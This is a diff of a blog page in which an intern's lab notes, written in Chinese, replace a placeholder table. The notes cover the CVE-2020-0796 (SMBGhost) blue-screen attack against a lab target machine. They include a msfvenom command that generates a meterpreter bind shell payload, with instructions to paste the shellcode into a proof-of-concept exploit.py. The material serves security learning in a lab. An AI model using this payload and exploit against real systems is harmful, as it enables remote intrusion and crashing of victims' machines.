@@ -56,7 +56,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/01/%E6%88%91%E7%9A%84/">我的</a>
+      <a class="p-name article-title" href="/2023/12/01/%E6%88%91%E7%9A%84/">实习第一星期学习内容汇总</a>
     </h1>
   
 
@@ -71,22 +71,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <table>
-<thead>
-<tr>
-<th>1</th>
-<th>2</th>
-<th>3</th>
-<th>4</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>2</td>
-<td>3</td>
-<td>4</td>
-</tr>
-</tbody></table>
+        <h1 id="永恒之黑漏洞蓝屏攻击"><a href="#永恒之黑漏洞蓝屏攻击" class="headerlink" title="永恒之黑漏洞蓝屏攻击"></a>永恒之黑漏洞蓝屏攻击</h1><h2 id="1-在靶机（ip192-168-186-128）里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip-关闭靶机防火墙并运行工具，检查漏洞风险"><a href="#1-在靶机（ip192-168-186-128）里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip-关闭靶机防火墙并运行工具，检查漏洞风险" class="headerlink" title="1.在靶机（ip192.168.186.128）里下载检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/关闭靶机防火墙并运行工具，检查漏洞风险"></a>1.在靶机（ip192.168.186.128）里下载检测工具：<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/%E5%85%B3%E9%97%AD%E9%9D%B6%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99%E5%B9%B6%E8%BF%90%E8%A1%8C%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E%E9%A3%8E%E9%99%A9">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/关闭靶机防火墙并运行工具，检查漏洞风险</a></h2><p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201163019434.png" alt="image-20231201163019434"></p>
+<h2 id="2-在kali中利用MSF生成木马："><a href="#2-在kali中利用MSF生成木马：" class="headerlink" title="2.在kali中利用MSF生成木马："></a>2.在kali中利用MSF生成木马：</h2><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;kali的IP地址 LPORT&#x3D;5555 -b ‘\x00’ -i 1 -f ，用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</p>
+<p><img src="https://raw.githubusercontent.com/zjh3515/image/main/imgimage-20231201163229551.png" alt="image-20231201163229551"></p>
 
       
     </div>
